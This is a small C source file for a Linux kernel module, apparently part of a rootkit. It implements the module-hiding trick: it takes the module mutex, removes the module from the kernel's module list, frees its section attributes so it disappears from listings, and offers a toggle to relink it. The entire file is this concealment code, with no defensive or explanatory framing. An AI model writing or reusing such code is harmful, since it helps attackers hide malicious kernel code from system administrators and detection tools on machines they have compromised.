#include <linux/module.h>
#include <linux/mutex.h>
#include <linux/slab.h>

#include "module.h"

int hide_m = 0;
static struct list_head *mod_list;

void hide(void)
{
	while (!mutex_trylock(&module_mutex))
		cpu_relax();
	mod_list = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
	mutex_unlock(&module_mutex);
	
	hide_m = 1;
}

void show(void)
{
	while (!mutex_trylock(&module_mutex))
		cpu_relax();
	list_add(&THIS_MODULE->list, mod_list);
	mutex_unlock(&module_mutex);
	
	hide_m = 0;
}

void hide_module(void)
{
    if (hide_m == 0)
        hide();
    else if (hide_m == 1)
        show();
}
